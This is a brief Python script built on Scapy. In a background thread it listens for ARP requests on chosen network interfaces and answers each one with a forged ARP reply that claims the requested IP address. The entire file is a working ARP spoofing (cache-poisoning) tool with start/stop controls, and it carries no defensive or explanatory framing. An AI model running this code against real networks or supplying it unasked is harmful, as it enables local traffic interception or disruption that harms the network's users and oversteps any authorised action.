from threading import Thread
from scapy.all import *
from scapy.layers.l2 import Ether, ARP

config = {
    "STOP_SPOOFING": False,
    "VERBOSE": False
}


def vprint(msg):
    """Verbose print"""
    if config["VERBOSE"]:
        print(msg)


def stop_spoof(pkt):
    return config["STOP_SPOOFING"]


def arp_sniff(interfaces):
    sniff(prn=craft_arp_spoof, filter="arp", store=0, iface=interfaces, stop_filter=stop_spoof)


def craft_arp_spoof(pkt):
    """sniffing for arp request from host in the network"""
    if pkt[ARP].op == 1:
        vprint(f"ARP Request detected: 'Who has {pkt[ARP].pdst}? Tell {pkt[ARP].psrc}'")
        arp_response = Ether(dst=pkt[ARP].hwsrc) / ARP(pdst=pkt[ARP].psrc, hwdst=RandMAC(), psrc=pkt[ARP].pdst, op=2)
        sendp(arp_response, verbose=0, iface=pkt.sniffed_on)
        vprint(f"[+] Sent to spoofed ARP to {pkt[ARP].psrc}")


def start(interfaces, verbose=False):
    config["VERBOSE"] = verbose
    arp_thread = Thread(target=arp_sniff, args=(interfaces,))
    arp_thread.daemon = True
    arp_thread.start()


def stop(verbose=False):
    config["STOP_SPOOFING"] = True
    vprint("Stopped ARP spoofing")
